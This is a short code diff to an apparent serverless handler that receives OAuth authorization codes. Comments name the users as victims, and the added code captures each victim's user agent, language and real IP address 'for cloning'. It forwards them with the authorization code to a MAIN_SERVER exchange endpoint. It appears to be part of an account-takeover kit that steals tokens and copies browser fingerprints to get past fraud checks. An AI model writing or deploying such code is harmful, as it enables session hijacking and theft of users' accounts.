@@ -25,7 +25,24 @@ export default {
       if (!code) {
         return new Response('Missing authorization code', { status: 400 });
       }
-      const exchangeUrl = `${MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}`;
+
+      // Capture the victim's browser fingerprint for cloning
+      const userAgent = request.headers.get('User-Agent') || '';
+      const acceptLanguage = request.headers.get('Accept-Language') || '';
+
+      // Capture the user's real IP address
+      let userIp = request.headers.get('CF-Connecting-IP') || request.headers.get('cf-connecting-ip');
+      if (!userIp) {
+        const xff = request.headers.get('X-Forwarded-For');
+        if (xff) {
+          userIp = xff.split(',')[0].trim();
+        }
+      }
+      if (!userIp) {
+        userIp = 'unknown';
+      }
+
+      const exchangeUrl = `${MAIN_SERVER}/exchange?code=${encodeURIComponent(code)}&user_ip=${encodeURIComponent(userIp)}&ua=${encodeURIComponent(userAgent)}&lang=${encodeURIComponent(acceptLanguage)}`;
       let tokenId = '';
       try {
         const res = await fetch(exchangeUrl, { method: 'GET' });
